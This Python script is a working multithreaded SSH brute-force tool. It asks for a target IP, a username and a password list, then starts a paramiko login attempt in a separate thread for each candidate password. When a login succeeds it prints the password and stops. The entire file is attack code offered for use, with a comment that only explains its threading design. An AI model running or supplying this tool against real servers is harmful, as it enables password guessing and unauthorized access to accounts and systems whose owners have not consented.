import paramiko
import sys
import os
import threading
import time
import termcolor
'''
This version of the threaded SSH bruteforcer mainly avoids using a global variable,
and instead uses threading.Event()
'''

host = input('[+] Target IP Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Passwords file: ')

# Define a threading.Event object for synchronization
stop_event = threading.Event()

def ssh_connect(password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_event.set()  # Set the stop_event to signal success
        print(termcolor.colored(f'[+] Password Successful: {password} for Account: {username}', 'green'))
    except paramiko.AuthenticationException:
        print(termcolor.colored(f'[-] Incorrect Password: {password}', 'red'))
    except Exception as e:
        print(termcolor.colored(f'[-] Error: {e}', 'red'))
    finally:
        ssh.close()

if not os.path.exists(input_file):
    print(termcolor.colored('[!!] FILE NOT FOUND', 'red'))
    sys.exit(1)

print(f'Starting Threaded SSH Bruteforce on {host} with Account: {username} * * *')
threads = []

with open(input_file, mode='r') as f:
    for line in f:
        if stop_event.is_set():
            break
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        threads.append(t)
        time.sleep(0.5)

# Join all threads after the loop finishes
for t in threads:
    t.join()
